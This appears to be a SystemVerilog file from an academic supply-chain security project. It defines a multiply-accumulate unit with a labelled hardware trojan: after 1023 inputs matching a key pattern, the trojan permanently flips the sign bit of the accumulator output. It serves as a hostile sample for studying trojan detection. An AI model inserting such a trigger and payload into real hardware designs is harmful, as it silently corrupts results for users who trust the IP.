// =============================================================================
// File        : mac_trojan.sv
// Project     : Supply Chain Security in 3PIP FPGA
// Author      : Kaustubh Pandey (230959054)
// Description : Trojan-infected MAC. Sequential trigger (1023 cycles),
//               payload: MSB inversion of accumulator (sign-flip attack).
// =============================================================================
`timescale 1ns / 1ps

module mac_trojan #(
    parameter int DATA_WIDTH    = 16,
    parameter int ACC_WIDTH     = 32,
    parameter int TRIGGER_COUNT = 1023,
    parameter logic [3:0] KEY_PATTERN = 4'hA
) (
    input  logic                    clk,
    input  logic                    rst_n,
    input  logic                    valid_in,
    input  logic                    acc_clr,
    input  logic [DATA_WIDTH-1:0]   a,
    input  logic [DATA_WIDTH-1:0]   b,
    output logic [ACC_WIDTH-1:0]    acc_out,
    output logic                    valid_out,
    output logic                    overflow
);
    logic [2*DATA_WIDTH-1:0] product;
    logic [ACC_WIDTH:0]      acc_ext;
    logic [ACC_WIDTH-1:0]    acc_reg;
    logic [ACC_WIDTH-1:0]    acc_next;
    logic                    overflow_reg;

    always_comb begin : comb_logic
        logic signed [ACC_WIDTH:0] sext_product;
        logic signed [ACC_WIDTH:0] sext_acc;
        product      = a * b;
        sext_product = $signed({{1{product[2*DATA_WIDTH-1]}}, product});
        sext_acc     = $signed({acc_reg[ACC_WIDTH-1], acc_reg});
        acc_ext      = sext_acc + sext_product;
        if (acc_ext[ACC_WIDTH] != acc_ext[ACC_WIDTH-1])
            acc_next = acc_ext[ACC_WIDTH] ? {1'b1, {(ACC_WIDTH-1){1'b0}}}
                                          : {1'b0, {(ACC_WIDTH-1){1'b1}}};
        else
            acc_next = acc_ext[ACC_WIDTH-1:0];
    end

    always_ff @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            acc_reg      <= '0;
            valid_out    <= 1'b0;
            overflow_reg <= 1'b0;
        end else begin
            valid_out <= valid_in;
            if (acc_clr) begin
                acc_reg      <= '0;
                overflow_reg <= 1'b0;
            end else if (valid_in) begin
                acc_reg      <= acc_next;
                overflow_reg <= (acc_ext[ACC_WIDTH] != acc_ext[ACC_WIDTH-1]);
            end
        end
    end
    assign overflow = overflow_reg;

    // ---- HARDWARE TROJAN ----------------------------------------------------
    logic [9:0]  trigger_cnt;
    logic        pattern_match;
    logic        trojan_armed;
    logic        trojan_active;

    assign pattern_match = (a[DATA_WIDTH-1 -: 4] == KEY_PATTERN);

    always_ff @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trigger_cnt   <= '0;
            trojan_armed  <= 1'b0;
            trojan_active <= 1'b0;
        end else begin
            if (valid_in && pattern_match && !trojan_armed) begin
                if (trigger_cnt < TRIGGER_COUNT[9:0])
                    trigger_cnt <= trigger_cnt + 1;
                else
                    trojan_armed <= 1'b1;
            end
            if (trojan_armed) trojan_active <= 1'b1;
        end
    end

    assign acc_out = trojan_active ? {~acc_reg[ACC_WIDTH-1], acc_reg[ACC_WIDTH-2:0]}
                                   : acc_reg;
endmodule
